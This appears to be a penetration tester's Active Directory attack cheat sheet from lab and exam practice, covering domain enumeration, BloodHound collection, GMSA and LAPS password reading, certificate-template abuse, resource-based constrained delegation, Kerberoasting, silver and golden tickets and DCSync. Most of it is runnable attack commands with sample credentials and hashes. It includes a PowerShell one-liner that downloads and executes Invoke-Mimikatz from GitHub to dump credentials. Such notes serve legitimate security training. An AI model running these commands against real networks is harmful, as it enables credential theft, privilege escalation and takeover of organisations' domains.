### Enterprise Admins
>Members of Domain Admins3 are among the most privileged objects in the domain. If an attacker compromises a member of this group (often referred to as domain administrators), they essentially gain complete control over the domain.

>This attack vector could extend beyond a single domain since an AD instance can host more than one domain in a domain tree or multiple domain trees in a domain forest. While there is a Domain Admins group for each domain in the forest, members of the Enterprise Admins group are granted full control over all the domains in the forest and have Administrator privilege on all DCs. This is obviously a high-value target for an attacker.
### Enumeration
>net.exe cant enumerate group members within groups,only user members
```
net user
net user /domain
net user jeff_admin /domain
net group groupname /domain
net localgroup
net localgroup groupname

PowerView.ps1:
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
Get-DomainGroup | select cn
```

```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
output:
Forest                  : corp.com
DomainControllers       : {DC01.corp.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner(DC name)   : DC01.corp.com
RidRoleOwner            : DC01.corp.com
InfrastructureRoleOwner : DC01.corp.com
Name(domain name)       : corp.com

PowerView.ps1:
Get-NetDomain
```
Active Directory User Enumeration
```
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt #From https://github.com/ropnop/kerbrute/releases

Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt <IP>
```
#### Nested Groups
```
powershell -ep bypass
Import-Module .\PowerView.ps1
Get-DomainGroup 'Service Personnel' | select samaccountname,memberof,member
Get-DomainGroup 'Service Personnel'

Get all belonged groups of user(michelle):
Get-DomainGroup -MemberIdentity 'michelle' | select samaccountname,memberof,member
Get-DomainGroup -MemberIdentity 'michelle' | select samaccountname
Get-DomainGroup -MemberIdentity 'michelle' 
```
#### Computer Info
```
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
Get-NetComputer | select operatingsystem,operatingsystemversion,dnshostname,distinguishedname

output:
pwdlastset                    : 10/2/2022 10:19:40 PM
logoncount                    : 319
msds-generationid             : {89, 27, 90, 188...}
serverreferencebl             : CN=DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=corp,DC=com
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DC1,OU=Domain Controllers,DC=corp,DC=com
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 10/13/2022 11:37:06 AM
name                          : DC1
objectsid                     : S-1-5-21-1987370270-658905905-1781884369-1000
samaccountname                : DC1$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 10/13/2022 6:37:06 PM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2022 Standard
instancetype                  : 4
msdfsr-computerreferencebl    : CN=DC1,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=corp,DC=com
objectguid                    : 8db9e06d-068f-41bc-945d-221622bca952
operatingsystemversion        : 10.0 (20348)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=corp,DC=com
dscorepropagationdata         : {9/2/2022 11:10:48 PM, 1/1/1601 12:00:01 AM}
serviceprincipalname          : {TERMSRV/DC1, TERMSRV/DC1.corp.com, Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC1.corp.com, ldap/DC1.corp.com/ForestDnsZones.corp.com...}
usncreated                    : 12293
lastlogon                     : 10/18/2022 3:37:56 AM
badpwdcount                   : 0
cn                            : DC1
useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
whencreated                   : 9/2/2022 11:10:48 PM
primarygroupid                : 516
iscriticalsystemobject        : True
msds-supportedencryptiontypes : 28
usnchanged                    : 178663
ridsetreferences              : CN=RID Set,CN=DC1,OU=Domain Controllers,DC=corp,DC=com
dnshostname                   : DC1.corp.com
```
#### Logged On Users
```
Find possible local administrative access on computers under the current user context:
PowerView.ps1 : Find-LocalAdminAccess

Enumerate active sessions:
.\PsLoggedon.exe \\client74

Enumerate IP address based on computername such as client74:
Get-NetSession -ComputerName client74
```
#### Object Permissions
GenericAll: Full permissions on object  
GenericWrite: Edit certain attributes on the object  
WriteOwner: Change ownership of the object  
WriteDACL: Edit ACE's applied to object  
AllExtendedRights: Change password, reset password, etc.  
ForceChangePassword: Password change for object  
Self (Self-Membership): Add ourselves to for example a group  
```
powershell -ep bypass
Import-module .\PowerView.ps1

Find SIDs which has GenericAll Permission on "Management Department" Group:
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

Find interesting domain object permissions whose permissions are GenericAll:
Find-InterestingDomainAcl | ? {$_.ActiveDirectoryRights -eq "GenericAll"}

Conver SIDs to UserAccount names:
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
```
When Stephanie has GenericAll permissions on "Management Department" group, you can add her to Management Department group
```
net group "Management Department" stephanie /add /domain
```
#### Enumerate Domain Shares
```
powershell -ep bypass
Import-module .\PowerView.ps1
Find-DomainShare
ls \\dc1.corp.com\"Important Files"\
type \\dc1.corp.com\"Important Files"\proof.txt
```
#### BloodHound
Initiation
```
Compromised machine: Import-Module .\SharpHound.ps1
Compromised machine: Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\

sudo neo4j stop
sudo neo4j start
kali: bloodhound
kali: username:neo4j, pass:kali
kali: drag zip file into bloodhound
```
Compatible Combination:
```
neo4j 4.4.26
bloodhound 4.3.1
SharpHound.ps1 1.1.1
```
#### Bloodhound-python
This will extract all json files if you have credential but no shell
```
bloodhound-python --dns-tcp -ns $IP -d hutch.offsec -u 'fmcsorley' -p 'CrabSharkJellyfish192' -c all
```
#### Abusing Read GMSAP Password
```
Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames
.\GMSAPasswordReader.exe --accountname=SVC_APACHE

[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 83AC7FECFBF44780E3AAF5D04DD368A5
[*]       aes128_cts_hmac_sha1 : 08E643C43F775FAC782EDBB04DD40541
[*]       aes256_cts_hmac_sha1 : 588C2BB865E771ECAADCB48ECCF4BCBCD421BF329B0133A213C83086F1A2E3D7
[*]       des_cbc_md5          : 9E340723700454E9

Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 0AFF0D9DFA8B436E6688697B0A47B50C (NTLM Hash)
[*]       aes128_cts_hmac_sha1 : C958BEE96DEE78F9035F460B91EC6D86
[*]       aes256_cts_hmac_sha1 : D3C18DAF21128CAFEAECE5BFF6599A0A4DFB2E9BE22F6CFE13677688B0A34988
[*]       des_cbc_md5          : 0804169DCECB6102
```
#### Abusing ReadLaps Password
>LAPS allows you to manage the local Administrator password (which is randomized, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorized users using ACLs. 
```
lapsdumper -u fmcsorley -p CrabSharkJellyfish192 -d hutch.offsec -l 192.168.153.122
lapsdumper -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc host
ldapsearch -v -c -D fmcsorley@hutch.offsec -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -H ldap://192.168.153.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```
#### Abusing GPO (Group Policy Object)
Check:
```
Import-Module .\PowerView.ps1
Get-NetGPO
Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9(gpcfilesyspath) -TargetType User -TargetName anirudh
```
Abuse:
```
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy" (add anirudh to local admin group)
gpupdate /force
```
#### Abusing Active Directory Certificates
Enumerating vulnerable certificates
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/39749455-0858-4ec2-aa17-320875ea1042)
```
certipy-ad find -u xxx -p xxxx -dc-ip xxx.xxx.xxx.xxx -stdout -vulnerable
```
Enumerating possible attackable certificates templates
```
./Certify.exe find /vulnerable
```
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/15fbd1d2-130b-4604-89f3-11367d080dc5)

使用“certipy-ad”与 Active Directory 证书服务进行交互，创建一个officer账户，用来授予在AD中管理证书和相关操作的权限。
```
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.xxx.xxx -ca manager-dc01-ca --add-officer raven -debug
```
这边证书模板用的是之前Certify.exe枚举的结果，最终用的subca模板提权成功
```
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.xxx.xxx -ca manager-dc01-ca -enable-template subca
```
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/a54d71b4-b1c8-4b81-9568-3066a7acfa18)
```
certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.xxx.xxx -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.xxx.xxx -ca manager-dc01-ca -issue-request 13
certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.xxx.xxx -ca manager-dc01-ca -retrieve 13
certipy-ad auth -pfx administrator.pfx
```
Certify.exe
``` 
./Certify.exe find /vulnerable /current-user
.\certify.exe request /ca:dc01.manager.htb\manager-DC01-CA /template:User /altname:Administrator
将"-----BEGIN RSA PRIVATE KEY-----"到"-----END CERTIFICATE-----"保存为cert.pem文件。
kali: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
.\Rubeus.exe asktgt /user:administrator /certificate:C:\Users\Ryan.Cooper\Documents\cert.pfx /getcredentials /show /nowrap
The result include administrator's hash
```
#### Resource Based Constrained Delegation Attack
```
Detection:
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericAll*' }

Output:
AceType               : AccessAllowed
ObjectDN(to)          : CN=RESOURCEDC,OU=Domain Controllers,DC=resourced,DC=local
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-537427935-490066102-1511301751-1000
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-537427935-490066102-1511301751-1105
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
Identity(from)        : resourced\L.Livingstone
```
Bloodhound showing GenericAll privileges on the Domain Controller  
![image](https://github.com/user-attachments/assets/8a75dfbe-58a3-44a6-a962-dd34daf4b465)
```
impacket-addcomputer resourced.local/l.livingstone(:password) -dc-ip 192.168.x.x -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
python3 rbcd.py -dc-ip 192.168.153.175 -t RESOURCEDC(hostname) -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.x.x

Alternate way:
impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'h4x' corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
impacket-rbcd -action write -delegate-to "BACKUP01$" -delegate-from "myComputer$" corp.com/mary -hashes :942f15864b02fdee9f742616ea1eb778
impacket-getST -spn cifs/backup01.corp.com -impersonate administrator 'corp.com/myComputer$:h4x'
export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
impacket-psexec administrator@backup01.corp.com -k -no-pass
```
![image](https://github.com/user-attachments/assets/dbf59a75-11c3-4517-b0e7-60f5894aba5b)
```
export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache

Change resourcedc.resourced.local machin_ip_address in /etc/hosts

impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.x.x
```

### Authentication
#### Minikatz(require local admin)
Load DemoEXE and run it locally.  
```
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')  
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"
https://github.com/KiritoLoveAsuna/Penetration-Testing/blob/main/Invoke-ReflectivePEInjection.ps1
```
Powershell run minikatz
```
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```
```
password hash:
1. privilege::debug
2. sekurlsa::logonpasswords
Cached Credentials:
1. privilege::debug
2. lsadump::cache
TGT and TGS:
1. sekurlsa::tickets
```
### Lateral Movement
/ticket - optional - filename for output the ticket - default is: ticket.kirbi.  
/ptt - no output in file, just inject the golden ticket in current session.
```
Failed logins result in a [-]
Successful logins result in a [+] Domain\Username:Password
Local admin access results in a (Pwn3d!) added after the login confirmation, shown below.

rdp(sometimes authentication not correct):
(To enable passing the hash in xfreerdp, cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f')
proxychains4 -f /etc/proxychains4.conf crackmapexec rdp 172.16.218.82 -u 'yoshi' -p 'Mushroom!'
proxychains4 -f /etc/proxychains4.conf crackmapexec smb 172.16.218.82 -u 'yoshi' -p 'Mushroom!' -M rdp -o ACTION='ENABLE'(Admin privilege can turn on rdp on machine)
proxychains4 -f /etc/proxychains4.conf xfreerdp /u:yoshi /d:medtech.com(if this user is localuser,do not specify domain!!!!!) /p:Mushroom! /v:172.16.218.82:port /cert-ignore
xfreerdp /v:192.168.153.175 /cert-ignore /u:L.Livingstone /pth:19a3a7550ce8c505c2d46b5e39d6f808

smb(-x requires admin privilege):
for impacket-psexec.py to have shell by smb, Admin$ or C$ need to be writable
proxychains4 -f /etc/proxychains4.conf smbclient //172.16.196.13/IPC$(sharename) -U offsec%lab

mssql:
impacket-mssqlclient relia.com/dnnuser:DotNetNukeDatabasePassword\!@192.168.192.248 -port 49965

password spray:
cme protocol ip.txt -u user1 user2 user3 -p pass1 pass2 pass3

winrm:
cme winrm ip -u celia.almeda -H 19a3a7550ce8c505c2d46b5e39d6f808
cme winrm ip -u celia.almeda -p password
```

#### Dump the local password hash and domain cached hash
```
impacket-secretsdump -sam SAM(local SAM file) -system SYSTEM(local SYSTEM file) local
impacket-secretsdump celia.almeda:7k8XHk3dMtmpnC7@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt
impacket-secretsdump celia.almeda@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt -hashes lm:nt
```

#### Abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket(TGT) and gain rce
https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
```
sekurlsa::logonpasswords
sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
net use \\dc01(logon server)
klist
.\PsExec.exe \\dc01 or \\DC01/Allison cmd.exe
```
#### AS-REP Roasting(Require Do not require Kerberos preauthentication enabled)
Enum users with Do not require Kerberos preauthentication enabled
```
PowerView's Get-DomainUser function with the option -PreauthNotRequired
kali: impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast domain/username:pass
```
Extract hashes and Crack
```
.\Rubeus.exe asreproast /nowrap
hashcat -a 0 -m 18200 hashes.asreproast2 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
#### Kerberoasting
>The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline. You can know that a user account is being used as a service because the property "ServicePrincipalName" is not null.

>Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.

>You need valid credentials inside the domain.
```
Check all SPNs within the domain:
setspn -Q */*
```
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
hashcat -a 0 -m 13100 hashes.kerberoast rockyou.txt
```
>If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate or rdate to do so.
```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 domain/username:pass -outputfile <output_TGSs_file>
```
#### Silver Tickets(Require SPN's hash, Domain's SID, SPN)
>Once we have access to the password hash of the SPN, a machine account, or user, we can forge the related service tickets for any users and permissions. This is a great way of accessing SPNs in later phases of a penetration test, as we need privileged access in most situations to retrieve the password hash of the SPN.

>Since silver and golden tickets represent powerful attack techniques, Microsoft created a security patch to update the PAC structure.5 With this patch in place, the extended PAC structure field PAC_REQUESTOR needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.
```
whoami /user
kerberos::purge
kerberos::golden /user:jeffadmin(impersonated user) /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part from whoami /user) /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327(password hash of iis_service) /ptt
kerberos::list
```
```
Get Domain's sid:
Get-LocalUser -Name 'svc_mssql' | select name,sid(result without the last 3digits)

String Convert to NTLM hash:
https://codebeautify.org/ntlm-hash-generator

Get SPN:
Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
or
Import-Module .\PowerView.ps1
setspn -L svc_mssql

Exploiting silver ticket:
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
# To generate the TGS with AES key
impacket-ticketer -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn> -user-id 500 Administrator

export KRB5CCNAME=$PWD/Administrator.ccache

Klist to view kerberos tickets

/etc/hosts:
192.168.227.21  nagoya.nagoya-industries.com(from MSSQL/nagoya.nagoya-industries.com@NAGOYA-INDUSTRIES.COM)

impacket-mssqlclient -k nagoya.nagoya-industries.com
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```
#### Pass The Hash/Pass The Key
>In this attack, an attacker intercepts and steals a valid ticket-granting ticket (TGT) or service ticket (TGS) from a compromised user or service account.

>The attacker then "passes" this stolen ticket to authenticate themselves as the compromised user or service without needing to know the account's password.
```
sekurlsa::tickets /export (export all kirbi files)
kerberos::ptt [0;3e7]-0-0-40a00000-ted@krbtgt-web01.exam.com-exam.com.kirbi (load into memory)
```
```
# Request the TGT with hash
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
# Request the TGT with password
python getTGT.py <domain_name>/<user_name>:[password]
# If not provided, password is asked

# Set the TGT for impacket use
export KRB5CCNAME=<TGT_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass

# To convert tickets between Linux/Windows format with ticket_converter.py:
impacket-ticket_converter ticket.kirbi ticket.ccache
impacket-ticket_converter ticket.ccache ticket.kirbi
```

### Persistence
#### Golden Tickets(only if we can get password hash of a domain user account called krbtgt)
>The golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself to work as a persistence method
```
privilege::debug
lsadump::lsa /patch(get password hash)
kerberos::purge
kerberos::golden /user:any_exist_domain_user /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part,from lsadump::lsa /patch) /krbtgt:75b60230a2394a812000dbfad8415965(from lsadump::lsa /patch) /ptt
misc::cmd(launch a new command prompt)
psexec.exe \\dc01 cmd.exe

# To generate the TGT with NTLM
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
# To generate the TGT with AES key
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
# Set the ticket for impacket use
export KRB5CCNAME=<TGS_ccache_file>

# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```
#### Domain Controller Synchronization
>If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a dcsync4 attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain.

>to perform this attack, we need a user that is a member of Domain Admins, Enterprise Admins, or Administrators, because there are certain rights required to start the replication. Alternatively, we can leverage a user with these rights assigned, though we're far less likely to encounter one of these in a real penetration test.
```
lsadump::dcsync /user:Administrator
lsadump::dcsync /user:corp\Administrator
kali: impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```
